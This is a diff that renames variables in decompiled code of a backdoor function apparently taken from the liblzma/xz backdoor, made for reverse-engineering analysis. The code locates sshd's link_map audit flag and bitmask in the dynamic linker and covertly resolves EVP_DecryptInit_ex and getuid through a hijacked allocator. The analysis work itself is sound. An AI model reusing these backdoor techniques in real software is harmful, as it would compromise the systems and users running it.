@@ -18,32 +18,32 @@ BOOL find_link_map_l_audit_any_plt_bitmask
                (backdoor_data_handle_t *data,instruction_search_ctx_t *search_ctx)
 
 {
-  imported_funcs_t *piVar1;
-  libc_imports_t *plVar2;
-  u32 *puVar3;
-  backdoor_hooks_data_t *pbVar4;
-  undefined1 uVar5;
-  BOOL BVar6;
-  u32 uVar7;
+  imported_funcs_t *imports;
+  libc_imports_t *libc_imports;
+  u32 *matched_register;
+  backdoor_hooks_data_t *hook_table;
+  uchar mask_register;
+  BOOL success;
+  u32 mask_bits;
   lzma_allocator *allocator;
-  pfn_EVP_DecryptInit_ex_t ppVar8;
-  lzma_allocator *allocator_00;
-  pfn_getuid_t ppVar9;
-  link_map *plVar10;
-  undefined1 uVar11;
+  pfn_EVP_DecryptInit_ex_t evp_decryptinit_stub;
+  lzma_allocator *libc_allocator;
+  pfn_getuid_t getuid_stub;
+  link_map *audit_flag_slot;
+  uchar lea_ptr_register;
   byte bVar12;
   long lVar13;
   u8 *puVar14;
   dasm_ctx_t *pdVar15;
   int iVar16;
-  u8 *code_start;
+  u8 *audit_sym_cursor;
   byte bVar17;
   dasm_ctx_t local_80;
   
   bVar17 = 0;
-  BVar6 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x97,0x1f,9);
-  if (BVar6 != FALSE) {
-    code_start = search_ctx->start_addr;
+  success = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x97,0x1f,9);
+  if (success != FALSE) {
+    audit_sym_cursor = search_ctx->start_addr;
     pdVar15 = &local_80;
     for (lVar13 = 0x16; lVar13 != 0; lVar13 = lVar13 + -1) {
       *(undefined4 *)&pdVar15->instruction = 0;
@@ -51,58 +51,58 @@ BOOL find_link_map_l_audit_any_plt_bitmask
     }
     allocator = get_lzma_allocator();
     allocator->opaque = data->elf_handles->libcrypto;
-    ppVar8 = (pfn_EVP_DecryptInit_ex_t)lzma_alloc(0xc08,allocator);
-    piVar1 = search_ctx->imported_funcs;
-    piVar1->EVP_DecryptInit_ex = ppVar8;
-    if (ppVar8 != (pfn_EVP_DecryptInit_ex_t)0x0) {
-      piVar1->resolved_imports_count = piVar1->resolved_imports_count + 1;
+    evp_decryptinit_stub = (pfn_EVP_DecryptInit_ex_t)lzma_alloc(0xc08,allocator);
+    imports = search_ctx->imported_funcs;
+    imports->EVP_DecryptInit_ex = evp_decryptinit_stub;
+    if (evp_decryptinit_stub != (pfn_EVP_DecryptInit_ex_t)0x0) {
+      imports->resolved_imports_count = imports->resolved_imports_count + 1;
     }
-    plVar2 = piVar1->libc;
-    allocator_00 = get_lzma_allocator();
-    allocator_00->opaque = data->elf_handles->libc;
-    ppVar9 = (pfn_getuid_t)lzma_alloc(0x348,allocator_00);
-    plVar2->getuid = ppVar9;
-    if (ppVar9 != (pfn_getuid_t)0x0) {
-      plVar2->resolved_imports_count = plVar2->resolved_imports_count + 1;
+    libc_imports = imports->libc;
+    libc_allocator = get_lzma_allocator();
+    libc_allocator->opaque = data->elf_handles->libc;
+    getuid_stub = (pfn_getuid_t)lzma_alloc(0x348,libc_allocator);
+    libc_imports->getuid = getuid_stub;
+    if (getuid_stub != (pfn_getuid_t)0x0) {
+      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
     }
     iVar16 = 0;
     bVar17 = 0xff;
-    for (; code_start < search_ctx->end_addr; code_start = code_start + local_80.instruction_size) {
-      BVar6 = x86_dasm(&local_80,code_start,search_ctx->end_addr);
-      if (BVar6 == FALSE) {
+    for (; audit_sym_cursor < search_ctx->end_addr; audit_sym_cursor = audit_sym_cursor + local_80.instruction_size) {
+      success = x86_dasm(&local_80,audit_sym_cursor,search_ctx->end_addr);
+      if (success == FALSE) {
         return FALSE;
       }
       if (iVar16 == 0) {
         if (((local_80._40_4_ == 0x1036) && (((ushort)local_80.prefix._0_4_ & 0x140) == 0x140)) &&
            ((byte)(local_80.prefix._13_1_ - 1) < 2)) {
-          uVar11 = 0;
+          lea_ptr_register = 0;
           if ((local_80.prefix._0_4_ & 0x40) == 0) {
-            uVar5 = 0;
+            mask_register = 0;
             if (((local_80.prefix._0_4_ & 0x1040) != 0) &&
-               (uVar5 = local_80.prefix.decoded.flags2 & 0x10, (local_80.prefix._0_4_ & 0x1000) != 0
+               (mask_register = local_80.prefix.decoded.flags2 & 0x10, (local_80.prefix._0_4_ & 0x1000) != 0
                )) {
               if ((local_80.prefix._0_4_ & 0x20) == 0) {
-                uVar11 = 0;
-                uVar5 = local_80.imm64_reg;
+                lea_ptr_register = 0;
+                mask_register = local_80.imm64_reg;
               }
               else {
-                uVar5 = local_80.imm64_reg | ((byte)local_80.prefix.decoded.rex & 1) << 3;
+                mask_register = local_80.imm64_reg | ((byte)local_80.prefix.decoded.rex & 1) << 3;
               }
             }
           }
           else {
-            uVar5 = local_80.prefix.decoded.flags & 0x20;
+            mask_register = local_80.prefix.decoded.flags & 0x20;
             if ((local_80.prefix._0_4_ & 0x20) == 0) {
-              uVar11 = local_80.prefix._15_1_;
+              lea_ptr_register = local_80.prefix._15_1_;
               if ((local_80.prefix._0_4_ & 0x1040) != 0) {
-                uVar5 = local_80.prefix._14_1_;
+                mask_register = local_80.prefix._14_1_;
               }
             }
             else {
-              uVar11 = local_80.prefix._15_1_ | (char)local_80.prefix.decoded.rex * '\b' & 8U;
-              uVar5 = 0;
+              lea_ptr_register = local_80.prefix._15_1_ | (char)local_80.prefix.decoded.rex * '\b' & 8U;
+              mask_register = 0;
               if ((local_80.prefix._0_4_ & 0x1040) != 0) {
-                uVar5 = local_80.prefix._14_1_ | (char)local_80.prefix.decoded.rex * '\x02' & 8U;
+                mask_register = local_80.prefix._14_1_ | (char)local_80.prefix.decoded.rex * '\x02' & 8U;
               }
             }
           }
@@ -113,59 +113,59 @@ BOOL find_link_map_l_audit_any_plt_bitmask
             puVar14 = local_80.instruction + (long)(local_80.mem_disp + local_80.instruction_size);
           }
           if (((u8 *)(ulong)*(uint *)&search_ctx->offset_to_match == puVar14) &&
-             (((int)(uint)*(ushort *)search_ctx->output_register >> (uVar11 & 0x1f) & 1U) != 0)) {
-            *(undefined1 *)((long)search_ctx->output_register + 2) = uVar5;
+             (((int)(uint)*(ushort *)search_ctx->output_register >> (lea_ptr_register & 0x1f) & 1U) != 0)) {
+            *(undefined1 *)((long)search_ctx->output_register + 2) = mask_register;
             iVar16 = 1;
           }
         }
       }
       else if (iVar16 == 1) {
         if ((local_80._40_4_ & 0xfffffffd) == 0x89) {
-          puVar3 = search_ctx->output_register_to_match;
-          uVar11 = local_80.prefix.decoded.flags & 0x40;
+          matched_register = search_ctx->output_register_to_match;
+          lea_ptr_register = local_80.prefix.decoded.flags & 0x40;
           if ((local_80.prefix._0_4_ & 0x1040) == 0) {
-            uVar5 = 0;
+            mask_register = 0;
             if ((local_80.prefix._0_4_ & 0x40) != 0) goto LAB_00104d83;
-            if (*(char *)((long)puVar3 + 2) != '\0') goto LAB_00104e97;
+            if (*(char *)((long)matched_register + 2) != '\0') goto LAB_00104e97;
             bVar12 = 0;
 LAB_00104da0:
-            if (search_ctx->output_register[2] != uVar11) goto LAB_00104da9;
+            if (search_ctx->output_register[2] != lea_ptr_register) goto LAB_00104da9;
           }
           else {
             if ((local_80.prefix._0_4_ & 0x40) == 0) {
               if ((local_80.prefix._0_4_ & 0x1000) == 0) {
-                if (*(char *)((long)puVar3 + 2) == '\0') {
-                  uVar5 = 0;
+                if (*(char *)((long)matched_register + 2) == '\0') {
+                  mask_register = 0;
                   bVar12 = 0;
                   goto LAB_00104da0;
                 }
                 goto LAB_00104e97;
               }
-              uVar5 = local_80.imm64_reg;
+              mask_register = local_80.imm64_reg;
               if ((local_80.prefix._0_4_ & 0x20) != 0) {
-                uVar5 = local_80.imm64_reg | ((byte)local_80.prefix.decoded.rex & 1) << 3;
+                mask_register = local_80.imm64_reg | ((byte)local_80.prefix.decoded.rex & 1) << 3;
               }
             }
             else {
-              uVar5 = local_80.prefix._14_1_;
+              mask_register = local_80.prefix._14_1_;
               if ((local_80.prefix._0_4_ & 0x20) != 0) {
-                uVar5 = local_80.prefix._14_1_ | (char)local_80.prefix.decoded.rex * '\x02' & 8U;
+                mask_register = local_80.prefix._14_1_ | (char)local_80.prefix.decoded.rex * '\x02' & 8U;
               }
 LAB_00104d83:
-              uVar11 = local_80.prefix._15_1_;
+              lea_ptr_register = local_80.prefix._15_1_;
               if ((local_80.prefix._0_4_ & 0x20) != 0) {
-                uVar11 = local_80.prefix._15_1_ | ((byte)local_80.prefix.decoded.rex & 1) << 3;
+                lea_ptr_register = local_80.prefix._15_1_ | ((byte)local_80.prefix.decoded.rex & 1) << 3;
               }
             }
-            bVar12 = *(byte *)((long)puVar3 + 2);
-            if (bVar12 == uVar5) goto LAB_00104da0;
+            bVar12 = *(byte *)((long)matched_register + 2);
+            if (bVar12 == mask_register) goto LAB_00104da0;
 LAB_00104da9:
-            if ((uVar11 != bVar12) || (search_ctx->output_register[2] != uVar5)) goto LAB_00104e97;
+            if ((lea_ptr_register != bVar12) || (search_ctx->output_register[2] != mask_register)) goto LAB_00104e97;
           }
           iVar16 = 2;
-          bVar17 = uVar11;
+          bVar17 = lea_ptr_register;
           if (local_80._40_4_ != 0x89) {
-            bVar17 = uVar5;
+            bVar17 = mask_register;
           }
         }
       }
@@ -194,12 +194,12 @@ LAB_00104da9:
         }
         if (bVar17 == bVar12) {
           if ((local_80.operand_zeroextended < 0x100) &&
-             (uVar7 = count_bits(local_80.operand_zeroextended), uVar7 == 1)) {
-            pbVar4 = search_ctx->hooks;
-            plVar10 = data->data->main_map + *(uint *)&search_ctx->offset_to_match;
-            (pbVar4->ldso_ctx).sshd_link_map_l_audit_any_plt_addr = plVar10;
-            (pbVar4->ldso_ctx).link_map_l_audit_any_plt_bitmask = (u8)local_80.operand_zeroextended;
-            if ((plVar10->_opaque & local_80.operand_zeroextended) == 0) {
+             (mask_bits = count_bits(local_80.operand_zeroextended), mask_bits == 1)) {
+            hook_table = search_ctx->hooks;
+            audit_flag_slot = data->data->main_map + *(uint *)&search_ctx->offset_to_match;
+            (hook_table->ldso_ctx).sshd_link_map_l_audit_any_plt_addr = audit_flag_slot;
+            (hook_table->ldso_ctx).link_map_l_audit_any_plt_bitmask = (u8)local_80.operand_zeroextended;
+            if ((audit_flag_slot->_opaque & local_80.operand_zeroextended) == 0) {
               return TRUE;
             }
           }
@@ -211,7 +211,7 @@ LAB_00104e97:
     }
     allocator->opaque = data->elf_handles->libcrypto;
     lzma_free(search_ctx->imported_funcs->EVP_DecryptInit_ex,allocator);
-    lzma_free(plVar2->getuid,allocator_00);
+    lzma_free(libc_imports->getuid,libc_allocator);
   }
   return FALSE;
 }
